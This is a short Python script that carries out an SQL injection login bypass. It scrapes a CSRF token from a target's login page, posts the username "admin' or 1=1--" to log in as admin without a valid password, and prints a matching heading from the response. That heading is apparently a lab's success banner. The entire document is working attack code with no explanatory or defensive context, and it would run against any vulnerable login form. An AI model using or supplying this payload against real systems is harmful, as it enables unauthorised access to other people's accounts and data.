#!/usr/bin/python3

import re
import requests
import argparse
from bs4 import BeautifulSoup

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', action='store', dest='url', help='The url', required=True)
    pattern = re.compile("<h4>(C.+?!)</h4>")
    args = parser.parse_args()
    url = args.url
    if url[-1:] == "/":
        url = url[:-1]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
    }

    login_data = {
        'url': '/login',
        'login': 'true',
        'csrf' :"blahblahblah",
        'username' : "admin' or 1=1--",
        'password' : "test"
    }
    try:
        with requests.Session() as s:
            r = s.get(url + login_data["url"], headers=headers)
            soup = BeautifulSoup(r.content, 'lxml')
            login_data['csrf'] = soup.find('input', attrs={'name': 'csrf'})['value']
            r = s.post(url, data=login_data, headers=headers)
            print(re.findall(pattern, r.text))
    except requests.exceptions.ConnectionError as e:
        print(e)
        exit(-1)


if __name__ == '__main__':
    main()
